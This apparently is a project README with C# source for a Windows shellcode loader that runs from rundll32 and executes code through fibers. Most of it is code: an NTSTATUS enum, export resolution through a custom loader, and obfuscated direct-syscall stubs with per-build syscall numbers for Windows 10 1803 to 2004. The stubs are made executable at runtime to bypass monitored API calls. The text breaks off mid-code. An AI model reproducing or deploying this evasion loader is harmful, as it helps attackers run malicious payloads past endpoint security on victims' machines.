# FiberShellcodeSyscall
Using syscall when possible, ZwAllocateVirtualMemory, ZwProtectVirtualMemory and ZwWriteVirtualMemory. It seems that Fibers handle don't exist in kernel, more have to be done to solve this.

This execute calc, uses syscalls when possible Fibers funcs are still native calls, compiled with csc.exe, entrypoint exec. Execution: rundll32 Fiber.dll,exec or rundll32 Fiber.dll,#1 (ordinal number) Only 64 bit OS, tested on build 2004.

Fiber.cs:

```
using System;
using System.Security;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;
using System.Management;
using System.Security.Principal;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security.Permissions;
using Microsoft.Win32.SafeHandles;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using System.IO;

public class code
{

    public enum NTSTATUS : uint
    {
        Success = 0x00000000,
        Wait0 = 0x00000000,
        Wait1 = 0x00000001,
        Wait2 = 0x00000002,
        Wait3 = 0x00000003,
        Wait63 = 0x0000003f,
        Abandoned = 0x00000080,
        AbandonedWait0 = 0x00000080,
        AbandonedWait1 = 0x00000081,
        AbandonedWait2 = 0x00000082,
        AbandonedWait3 = 0x00000083,
        AbandonedWait63 = 0x000000bf,
        UserApc = 0x000000c0,
        KernelApc = 0x00000100,
        Alerted = 0x00000101,
        Timeout = 0x00000102,
        Pending = 0x00000103,
        Reparse = 0x00000104,
        MoreEntries = 0x00000105,
        NotAllAssigned = 0x00000106,
        SomeNotMapped = 0x00000107,
        OpLockBreakInProgress = 0x00000108,
        VolumeMounted = 0x00000109,
        RxActCommitted = 0x0000010a,
        NotifyCleanup = 0x0000010b,
        NotifyEnumDir = 0x0000010c,
        NoQuotasForAccount = 0x0000010d,
        PrimaryTransportConnectFailed = 0x0000010e,
        PageFaultTransition = 0x00000110,
        PageFaultDemandZero = 0x00000111,
        PageFaultCopyOnWrite = 0x00000112,
        PageFaultGuardPage = 0x00000113,
        PageFaultPagingFile = 0x00000114,
        CrashDump = 0x00000116,
        ReparseObject = 0x00000118,
        NothingToTerminate = 0x00000122,
        ProcessNotInJob = 0x00000123,
        ProcessInJob = 0x00000124,
        ProcessCloned = 0x00000129,
        FileLockedWithOnlyReaders = 0x0000012a,
        FileLockedWithWriters = 0x0000012b,
        Informational = 0x40000000,
        ObjectNameExists = 0x40000000,
        ThreadWasSuspended = 0x40000001,
        WorkingSetLimitRange = 0x40000002,
        ImageNotAtBase = 0x40000003,
        RegistryRecovered = 0x40000009,
        Warning = 0x80000000,
        GuardPageViolation = 0x80000001,
        DatatypeMisalignment = 0x80000002,
        Breakpoint = 0x80000003,
        SingleStep = 0x80000004,
        BufferOverflow = 0x80000005,
        NoMoreFiles = 0x80000006,
        HandlesClosed = 0x8000000a,
        PartialCopy = 0x8000000d,
        DeviceBusy = 0x80000011,
        InvalidEaName = 0x80000013,
        EaListInconsistent = 0x80000014,
        NoMoreEntries = 0x8000001a,
        LongJump = 0x80000026,
        DllMightBeInsecure = 0x8000002b,
        Error = 0xc0000000,
        Unsuccessful = 0xc0000001,
        NotImplemented = 0xc0000002,
        InvalidInfoClass = 0xc0000003,
        InfoLengthMismatch = 0xc0000004,
        AccessViolation = 0xc0000005,
        InPageError = 0xc0000006,
        PagefileQuota = 0xc0000007,
        InvalidHandle = 0xc0000008,
        BadInitialStack = 0xc0000009,
        BadInitialPc = 0xc000000a,
        InvalidCid = 0xc000000b,
        TimerNotCanceled = 0xc000000c,
        InvalidParameter = 0xc000000d,
        NoSuchDevice = 0xc000000e,
        NoSuchFile = 0xc000000f,
        InvalidDeviceRequest = 0xc0000010,
        EndOfFile = 0xc0000011,
        WrongVolume = 0xc0000012,
        NoMediaInDevice = 0xc0000013,
        NoMemory = 0xc0000017,
        ConflictingAddresses = 0xc0000018,
        NotMappedView = 0xc0000019,
        UnableToFreeVm = 0xc000001a,
        UnableToDeleteSection = 0xc000001b,
        IllegalInstruction = 0xc000001d,
        AlreadyCommitted = 0xc0000021,
        AccessDenied = 0xc0000022,
        BufferTooSmall = 0xc0000023,
        ObjectTypeMismatch = 0xc0000024,
        NonContinuableException = 0xc0000025,
        BadStack = 0xc0000028,
        NotLocked = 0xc000002a,
        NotCommitted = 0xc000002d,
        InvalidParameterMix = 0xc0000030,
        ObjectNameInvalid = 0xc0000033,
        ObjectNameNotFound = 0xc0000034,
        ObjectNameCollision = 0xc0000035,
        ObjectPathInvalid = 0xc0000039,
        ObjectPathNotFound = 0xc000003a,
        ObjectPathSyntaxBad = 0xc000003b,
        DataOverrun = 0xc000003c,
        DataLate = 0xc000003d,
        DataError = 0xc000003e,
        CrcError = 0xc000003f,
        SectionTooBig = 0xc0000040,
        PortConnectionRefused = 0xc0000041,
        InvalidPortHandle = 0xc0000042,
        SharingViolation = 0xc0000043,
        QuotaExceeded = 0xc0000044,
        InvalidPageProtection = 0xc0000045,
        MutantNotOwned = 0xc0000046,
        SemaphoreLimitExceeded = 0xc0000047,
        PortAlreadySet = 0xc0000048,
        SectionNotImage = 0xc0000049,
        SuspendCountExceeded = 0xc000004a,
        ThreadIsTerminating = 0xc000004b,
        BadWorkingSetLimit = 0xc000004c,
        IncompatibleFileMap = 0xc000004d,
        SectionProtection = 0xc000004e,
        EasNotSupported = 0xc000004f,
        EaTooLarge = 0xc0000050,
        NonExistentEaEntry = 0xc0000051,
        NoEasOnFile = 0xc0000052,
        EaCorruptError = 0xc0000053,
        FileLockConflict = 0xc0000054,
        LockNotGranted = 0xc0000055,
        DeletePending = 0xc0000056,
        CtlFileNotSupported = 0xc0000057,
        UnknownRevision = 0xc0000058,
        RevisionMismatch = 0xc0000059,
        InvalidOwner = 0xc000005a,
        InvalidPrimaryGroup = 0xc000005b,
        NoImpersonationToken = 0xc000005c,
        CantDisableMandatory = 0xc000005d,
        NoLogonServers = 0xc000005e,
        NoSuchLogonSession = 0xc000005f,
        NoSuchPrivilege = 0xc0000060,
        PrivilegeNotHeld = 0xc0000061,
        InvalidAccountName = 0xc0000062,
        UserExists = 0xc0000063,
        NoSuchUser = 0xc0000064,
        GroupExists = 0xc0000065,
        NoSuchGroup = 0xc0000066,
        MemberInGroup = 0xc0000067,
        MemberNotInGroup = 0xc0000068,
        LastAdmin = 0xc0000069,
        WrongPassword = 0xc000006a,
        IllFormedPassword = 0xc000006b,
        PasswordRestriction = 0xc000006c,
        LogonFailure = 0xc000006d,
        AccountRestriction = 0xc000006e,
        InvalidLogonHours = 0xc000006f,
        InvalidWorkstation = 0xc0000070,
        PasswordExpired = 0xc0000071,
        AccountDisabled = 0xc0000072,
        NoneMapped = 0xc0000073,
        TooManyLuidsRequested = 0xc0000074,
        LuidsExhausted = 0xc0000075,
        InvalidSubAuthority = 0xc0000076,
        InvalidAcl = 0xc0000077,
        InvalidSid = 0xc0000078,
        InvalidSecurityDescr = 0xc0000079,
        ProcedureNotFound = 0xc000007a,
        InvalidImageFormat = 0xc000007b,
        NoToken = 0xc000007c,
        BadInheritanceAcl = 0xc000007d,
        RangeNotLocked = 0xc000007e,
        DiskFull = 0xc000007f,
        ServerDisabled = 0xc0000080,
        ServerNotDisabled = 0xc0000081,
        TooManyGuidsRequested = 0xc0000082,
        GuidsExhausted = 0xc0000083,
        InvalidIdAuthority = 0xc0000084,
        AgentsExhausted = 0xc0000085,
        InvalidVolumeLabel = 0xc0000086,
        SectionNotExtended = 0xc0000087,
        NotMappedData = 0xc0000088,
        ResourceDataNotFound = 0xc0000089,
        ResourceTypeNotFound = 0xc000008a,
        ResourceNameNotFound = 0xc000008b,
        ArrayBoundsExceeded = 0xc000008c,
        FloatDenormalOperand = 0xc000008d,
        FloatDivideByZero = 0xc000008e,
        FloatInexactResult = 0xc000008f,
        FloatInvalidOperation = 0xc0000090,
        FloatOverflow = 0xc0000091,
        FloatStackCheck = 0xc0000092,
        FloatUnderflow = 0xc0000093,
        IntegerDivideByZero = 0xc0000094,
        IntegerOverflow = 0xc0000095,
        PrivilegedInstruction = 0xc0000096,
        TooManyPagingFiles = 0xc0000097,
        FileInvalid = 0xc0000098,
        InstanceNotAvailable = 0xc00000ab,
        PipeNotAvailable = 0xc00000ac,
        InvalidPipeState = 0xc00000ad,
        PipeBusy = 0xc00000ae,
        IllegalFunction = 0xc00000af,
        PipeDisconnected = 0xc00000b0,
        PipeClosing = 0xc00000b1,
        PipeConnected = 0xc00000b2,
        PipeListening = 0xc00000b3,
        InvalidReadMode = 0xc00000b4,
        IoTimeout = 0xc00000b5,
        FileForcedClosed = 0xc00000b6,
        ProfilingNotStarted = 0xc00000b7,
        ProfilingNotStopped = 0xc00000b8,
        NotSameDevice = 0xc00000d4,
        FileRenamed = 0xc00000d5,
        CantWait = 0xc00000d8,
        PipeEmpty = 0xc00000d9,
        CantTerminateSelf = 0xc00000db,
        InternalError = 0xc00000e5,
        InvalidParameter1 = 0xc00000ef,
        InvalidParameter2 = 0xc00000f0,
        InvalidParameter3 = 0xc00000f1,
        InvalidParameter4 = 0xc00000f2,
        InvalidParameter5 = 0xc00000f3,
        InvalidParameter6 = 0xc00000f4,
        InvalidParameter7 = 0xc00000f5,
        InvalidParameter8 = 0xc00000f6,
        InvalidParameter9 = 0xc00000f7,
        InvalidParameter10 = 0xc00000f8,
        InvalidParameter11 = 0xc00000f9,
        InvalidParameter12 = 0xc00000fa,
        MappedFileSizeZero = 0xc000011e,
        TooManyOpenedFiles = 0xc000011f,
        Cancelled = 0xc0000120,
        CannotDelete = 0xc0000121,
        InvalidComputerName = 0xc0000122,
        FileDeleted = 0xc0000123,
        SpecialAccount = 0xc0000124,
        SpecialGroup = 0xc0000125,
        SpecialUser = 0xc0000126,
        MembersPrimaryGroup = 0xc0000127,
        FileClosed = 0xc0000128,
        TooManyThreads = 0xc0000129,
        ThreadNotInProcess = 0xc000012a,
        TokenAlreadyInUse = 0xc000012b,
        PagefileQuotaExceeded = 0xc000012c,
        CommitmentLimit = 0xc000012d,
        InvalidImageLeFormat = 0xc000012e,
        InvalidImageNotMz = 0xc000012f,
        InvalidImageProtect = 0xc0000130,
        InvalidImageWin16 = 0xc0000131,
        LogonServer = 0xc0000132,
        DifferenceAtDc = 0xc0000133,
        SynchronizationRequired = 0xc0000134,
        DllNotFound = 0xc0000135,
        IoPrivilegeFailed = 0xc0000137,
        OrdinalNotFound = 0xc0000138,
        EntryPointNotFound = 0xc0000139,
        ControlCExit = 0xc000013a,
        PortNotSet = 0xc0000353,
        DebuggerInactive = 0xc0000354,
        CallbackBypass = 0xc0000503,
        PortClosed = 0xc0000700,
        MessageLost = 0xc0000701,
        InvalidMessage = 0xc0000702,
        RequestCanceled = 0xc0000703,
        RecursiveDispatch = 0xc0000704,
        LpcReceiveBufferExpected = 0xc0000705,
        LpcInvalidConnectionUsage = 0xc0000706,
        LpcRequestsNotAllowed = 0xc0000707,
        ResourceInUse = 0xc0000708,
        ProcessIsProtected = 0xc0000712,
        VolumeDirty = 0xc0000806,
        FileCheckedOut = 0xc0000901,
        CheckOutRequired = 0xc0000902,
        BadFileType = 0xc0000903,
        FileTooLarge = 0xc0000904,
        FormsAuthRequired = 0xc0000905,
        VirusInfected = 0xc0000906,
        VirusDeleted = 0xc0000907,
        TransactionalConflict = 0xc0190001,
        InvalidTransaction = 0xc0190002,
        TransactionNotActive = 0xc0190003,
        TmInitializationFailed = 0xc0190004,
        RmNotActive = 0xc0190005,
        RmMetadataCorrupt = 0xc0190006,
        TransactionNotJoined = 0xc0190007,
        DirectoryNotRm = 0xc0190008,
        CouldNotResizeLog = 0xc0190009,
        TransactionsUnsupportedRemote = 0xc019000a,
        LogResizeInvalidSize = 0xc019000b,
        RemoteFileVersionMismatch = 0xc019000c,
        CrmProtocolAlreadyExists = 0xc019000f,
        TransactionPropagationFailed = 0xc0190010,
        CrmProtocolNotFound = 0xc0190011,
        TransactionSuperiorExists = 0xc0190012,
        TransactionRequestNotValid = 0xc0190013,
        TransactionNotRequested = 0xc0190014,
        TransactionAlreadyAborted = 0xc0190015,
        TransactionAlreadyCommitted = 0xc0190016,
        TransactionInvalidMarshallBuffer = 0xc0190017,
        CurrentTransactionNotValid = 0xc0190018,
        LogGrowthFailed = 0xc0190019,
        ObjectNoLongerExists = 0xc0190021,
        StreamMiniversionNotFound = 0xc0190022,
        StreamMiniversionNotValid = 0xc0190023,
        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
        CantOpenMiniversionWithModifyIntent = 0xc0190025,
        CantCreateMoreStreamMiniversions = 0xc0190026,
        HandleNoLongerValid = 0xc0190028,
        NoTxfMetadata = 0xc0190029,
        LogCorruptionDetected = 0xc0190030,
        CantRecoverWithHandleOpen = 0xc0190031,
        RmDisconnected = 0xc0190032,
        EnlistmentNotSuperior = 0xc0190033,
        RecoveryNotNeeded = 0xc0190034,
        RmAlreadyStarted = 0xc0190035,
        FileIdentityNotPersistent = 0xc0190036,
        CantBreakTransactionalDependency = 0xc0190037,
        CantCrossRmBoundary = 0xc0190038,
        TxfDirNotEmpty = 0xc0190039,
        IndoubtTransactionsExist = 0xc019003a,
        TmVolatile = 0xc019003b,
        RollbackTimerExpired = 0xc019003c,
        TxfAttributeCorrupt = 0xc019003d,
        EfsNotAllowedInTransaction = 0xc019003e,
        TransactionalOpenNotAllowed = 0xc019003f,
        TransactedMappingUnsupportedRemote = 0xc0190040,
        TxfMetadataAlreadyPresent = 0xc0190041,
        TransactionScopeCallbacksNotSet = 0xc0190042,
        TransactionRequiredPromotion = 0xc0190043,
        CannotExecuteFileInTransaction = 0xc0190044,
        TransactionsNotFrozen = 0xc0190045,
        MaximumNtStatus = 0xffffffff
};

[StructLayout(LayoutKind.Sequential, Pack=0)]
public struct UNICODE_STRING
{
    public ushort Length;
    public ushort MaximumLength;
    public IntPtr Buffer;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct OSVERSIONINFOEXW
{
    public int dwOSVersionInfoSize;
    public int dwMajorVersion;
    public int dwMinorVersion;
    public int dwBuildNumber;
    public int dwPlatformId;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
    public string szCSDVersion;
    public UInt16 wServicePackMajor;
    public UInt16 wServicePackMinor;
    public UInt16 wSuiteMask;
    public byte wProductType;
    public byte wReserved;
}

    [SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ProtectorX(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect );
		public static NTSTATUS Protector(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect)
		{
				IntPtr proc = GetProcAddress(Resolver(), "ZwProtectVirtualMemory");
				ProtectorX ProtectorFunc = (ProtectorX)Marshal.GetDelegateForFunctionPointer(proc, typeof(ProtectorX));
				return (NTSTATUS)ProtectorFunc( ProcessHandle, ref BaseAddress, ref RegionSize, NewProtect, ref OldProtect );
		}

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwProtectVirtualMemoryX(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 lpNumberOfBytesWritten);
		public static NTSTATUS ZwProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 lpNumberOfBytesWritten)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 16 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
                NTSTATUS status = Protector( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
                ZwProtectVirtualMemoryX ZwProtectVirtualMemoryFunc = (ZwProtectVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwProtectVirtualMemoryX));
                return (NTSTATUS)ZwProtectVirtualMemoryFunc( ProcessHandle, ref BaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, ref lpNumberOfBytesWritten);
            }
        }
    }

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwWriteVirtualMemoryX(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);
    public static NTSTATUS ZwWriteVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 3 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                UInt32 oldprotect = 0;
                NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
                ZwWriteVirtualMemoryX ZwWriteVirtualMemoryFunc = (ZwWriteVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwWriteVirtualMemoryX));
                return (NTSTATUS)ZwWriteVirtualMemoryFunc(ProcessHandle, BaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
            }
        }
    }

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwAllocateVirtualMemoryX( IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect );
    public static NTSTATUS ZwAllocateVirtualMemory( IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 4 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                UInt32 oldprotect = 0;
                NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, 0x40, ref oldprotect);
                ZwAllocateVirtualMemoryX ZwAllocateVirtualMemoryFunc = (ZwAllocateVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwAllocateVirtualMemoryX));
                return (NTSTATUS)ZwAllocateVirtualMemoryFunc(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);

            }
        }
    }

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate IntPtr ConvertThreadToFiberX( int fiberData );
    public static IntPtr ConvertThreadToFiberR( int fiberData )
    {
        IntPtr proc = GetProcAddress(GetlKernel(), "ConvertThreadToFiber");
        ConvertThreadToFiberX ConvertThreadToFiberFunc = (ConvertThreadToFiberX)Marshal.GetDelegateForFunctionPointer(proc, typeof(ConvertThreadToFiberX));
        return (IntPtr)ConvertThreadToFiberFunc( fiberData );
    }

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate IntPtr CreateFiberX( uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter );
    public static IntPtr CreateFiberR( uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter )
    {
        IntPtr proc = GetProcAddress(GetlKernel(), "CreateFiber");
        CreateFiberX CreateFiberFunc = (CreateFiberX)Marshal.GetDelegateForFunctionPointer(proc, typeof(CreateFiberX));
        return (IntPtr)CreateFiberFunc( dwStackSize, lpStartAddress, lpParameter );
    }

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate IntPtr SwitchToFiberX( IntPtr fiberAddress );
    public static IntPtr SwitchToFiberR( IntPtr fiberAddress )
    {
        IntPtr proc = GetProcAddress(GetlKernel(), "SwitchToFiber");
        SwitchToFiberX SwitchToFiberFunc = (SwitchToFiberX)Marshal.GetDelegateForFunctionPointer(proc, typeof(SwitchToFiberX));
        return (IntPtr)SwitchToFiberFunc( fiberAddress );
    }

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate bool DeleteFiberX( IntPtr fiberAddress );
    public static bool DeleteFiberR( IntPtr fiberAddress )
    {
        IntPtr proc = GetProcAddress(GetlKernel(), "DeleteFiber");
        DeleteFiberX DeleteFiberFunc = (DeleteFiberX)Marshal.GetDelegateForFunctionPointer(proc, typeof(DeleteFiberX));
        return (bool)DeleteFiberFunc( fiberAddress );
    }

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int LdrLoadDllX(IntPtr PathToFile, UInt32 dwFlags, ref UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);
    public static UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
    {
    		IntPtr proc = GetProcAddress(Resolver(), "LdrLoadDll");
    		LdrLoadDllX LdrLoadDll = (LdrLoadDllX)Marshal.GetDelegateForFunctionPointer(proc, typeof(LdrLoadDllX));
    		return (uint)LdrLoadDll(PathToFile, dwFlags, ref ModuleFileName, ref ModuleHandle);
    }

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate bool RtlInitUnicodeStringX(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
    public static void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
    {
    		IntPtr proc = GetProcAddress(Resolver(), "RtlInitUnicodeString");
    		RtlInitUnicodeStringX RtlInitUnicodeString = (RtlInitUnicodeStringX)Marshal.GetDelegateForFunctionPointer(proc, typeof(RtlInitUnicodeStringX));
    		RtlInitUnicodeString(ref DestinationString, SourceString);
    }

    public static IntPtr GetProcAddress(IntPtr hModule, string procName)
    {
    		return CustomLoadLibrary.GetExportAddress(hModule, procName);
    }

    private static IntPtr Resolver()
    {
    		return LoadLibrary("ntdll.dll");
    }

    private static IntPtr GetlKernel()
    {
    		return LoadLibrary("kernel32.dll");
    }

    public static IntPtr LoadLibrary(string name)
    {
    		return CustomLoadLibrary.GetDllAddress(name, true);
    }

    [SuppressUnmanagedCodeSecurity]
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern NTSTATUS RtlGetVersion(ref OSVERSIONINFOEXW versionInfo);


    		public static byte [] GetOSVersionAndReturnSyscall(byte sysType )
        {
            var syscall = new byte [] { 074, 138, 203, 185, 001, 001, 001, 001, 016, 006, 196 };
            var osVersionInfo = new OSVERSIONINFOEXW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEXW)) };
            NTSTATUS OSdata = RtlGetVersion(ref osVersionInfo);
    			  // Client OS Windows 10 build 1803, 1809, 1903, 1909, 2004
            if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 19041)) // 2004
               {
                      // ZwOpenProcess
                      if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwCreateThreadEx
                      if (sysType == 2) { syscall[4] = 194; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwWriteVirtualMemory
                      if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwAllocateVirtualMemory
                      if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwCreateSection
                      if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwMapViewOfSection
                      if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwCreateProcess
                      if (sysType == 7) { syscall[4] = 186; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwOpenThread
                      if (sysType == 8) {	for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x12E);	Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
    									// ZwResumeThread
                      if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwWaitForSingleObject
                      if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwSetContextThread
                      if (sysType == 11) { for (byte i = 0; i <= 10; i++) {syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x18B); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                      // ZwGetContextThread
                      if (sysType == 12) { syscall[4] = 243; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwClose
                      if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwOpenProcessToken
                      if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x128); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                      // ZwSuspendThread
                      if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1BC); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
    									// ZwProtectVirtualMemory
    									if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
    									// ZwCreateProcessEx
    									if (sysType == 17) { syscall[4] = 78; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
                } else

                      if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 18362 || osVersionInfo.dwBuildNumber == 18363)) // 1903 1909
                      {
                        // NtOpenProcess
                        if (sysType == 1) {syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtCreateThreadEx
                        if (sysType == 2) { syscall[4] = 190; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // ZwWriteVirtualMemory
                        if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtAllocateVirtualMemory
                        if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // ZwCreateSection
                        if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // ZwMapViewOfSection
                        if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // ZwCreateProcess
                        if (sysType == 7) { syscall[4] = 182; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // ZwOpenThread
                        if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                        // ZwResumeThread
                        if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // ZwWaitForSingleObject
                        if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // ZwSetContextThread
                        if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x185); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                        // ZwGetContextThread
                        if (sysType == 12) { syscall[4] = 238; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // ZwClose
                        if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // ZwOpenProcessToken
                        if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x123); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                        // ZwSuspendThread
                        if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1B6); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
    										// ZwProtectVirtualMemory
    										if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
                  } else

                        if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17134)) // 1803
                        {
                              // ZwOpenProcess
                              if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwCreateThreadEx
